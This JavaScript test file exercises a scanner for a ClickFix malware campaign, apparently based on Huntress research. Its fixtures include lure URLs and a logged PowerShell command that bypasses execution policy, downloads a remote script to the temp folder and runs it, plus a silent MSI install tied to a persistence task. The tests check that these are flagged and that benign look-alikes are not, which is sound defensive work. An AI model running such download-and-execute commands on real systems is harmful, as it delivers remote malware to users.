"use strict";

const assert = require("assert");
const fs = require("fs");
const os = require("os");
const path = require("path");
const { scanTarget } = require("../src/scanner");
const { hashFile } = require("../src/clickfix");

const root = fs.mkdtempSync(path.join(os.tmpdir(), "clickfix-browser-guard-"));
try {
  fs.writeFileSync(path.join(root, "saved-gpt.html"),
    '<a href="https://chatgpt.com/g/g-6ab6ba039440819185ed491740b11cf8-plus-5-6">Plus 5.6</a>Service Availability Notice: continue using the service through our backup domain');
  fs.writeFileSync(path.join(root, "redirect.har"),
    '{"url":"https:\\/\\/sites.google.com\\/view\\/antibot172881","text":"Cloudflare verification: paste a PowerShell command"}');
  fs.writeFileSync(path.join(root, "visit-only.har"),
    '{"url":"https://chatgpt.com/g/g-6ab595ad6554819181b686d4876efb80-plus-5-6"}');
  fs.writeFileSync(path.join(root, "windows-process.log"),
    'process=powershell.exe command="-ExecutionPolicy Bypass irm 1614733393/12 | Out-File $env:temp\\1777.ps1; & $env:temp\\1777.ps1"\n');
  fs.writeFileSync(path.join(root, "windows-install.json"),
    '{"process":"msiexec.exe /i C:\\\\Temp\\\\ISOSimple.msi /qn","task":"Canon Configuration Reader"}');
  fs.writeFileSync(path.join(root, "ordinary-activity.log"),
    'powershell.exe Get-Process\nmsiexec.exe /i printer.msi /qn\nCanon Configuration Reader\n');
  fs.writeFileSync(path.join(root, "research-notes.md"),
    'Huntress described the GPT, Google Sites path, and PowerShell chain.');
  fs.writeFileSync(path.join(root, "huntress-article.html"),
    '<title>Attackers Abuse ChatGPT Custom GPTs to Deliver RAT via ClickFix</title>g-6ab595ad6554819181b686d4876efb80-plus-5-6 sites.google.com/view/antibot172881');
  fs.writeFileSync(path.join(root, "research-notes.txt"),
    'powershell.exe irm 1614733393/12 | Out-File $env:temp\\1777.ps1');
  fs.writeFileSync(path.join(root, "ISOSimple.msi"), "benign test fixture");
  assert.strictEqual(hashFile(path.join(root, "ISOSimple.msi")),
    "f951f008acd9ba83a83967a010e8e89557a25056e822b2f0b9ea9ee2a8527c8b");

  const report = scanTarget(root);
  const byId = (id) => report.findings.filter((finding) => finding.id === id);
  assert.strictEqual(byId("huntress-custom-gpt-clickfix-lure").length, 1);
  assert.strictEqual(byId("huntress-google-sites-clickfix-lure").length, 1);
  assert.strictEqual(byId("huntress-custom-gpt-visit-lead").length, 1);
  assert.strictEqual(byId("huntress-custom-gpt-visit-lead")[0].severity, "medium");
  assert.strictEqual(byId("huntress-custom-gpt-clickfix-lure")[0].severity, "medium");
  assert.strictEqual(byId("huntress-google-sites-clickfix-lure")[0].severity, "medium");
  assert.strictEqual(byId("huntress-clickfix-powershell-stage").length, 1);
  assert.strictEqual(byId("huntress-clickfix-installer-persistence").length, 1);
  assert(!report.findings.some((finding) => finding.path === "ordinary-activity.log"));
  assert(!report.findings.some((finding) => finding.path === "research-notes.md"));
  assert(!report.findings.some((finding) => finding.path === "research-notes.txt"));
  assert(!report.findings.some((finding) => finding.path === "huntress-article.html"));
  assert(!report.findings.some((finding) => finding.path === "ISOSimple.msi"));
  console.log("ClickFix tests passed");
} finally {
  fs.rmSync(root, { recursive: true, force: true });
}
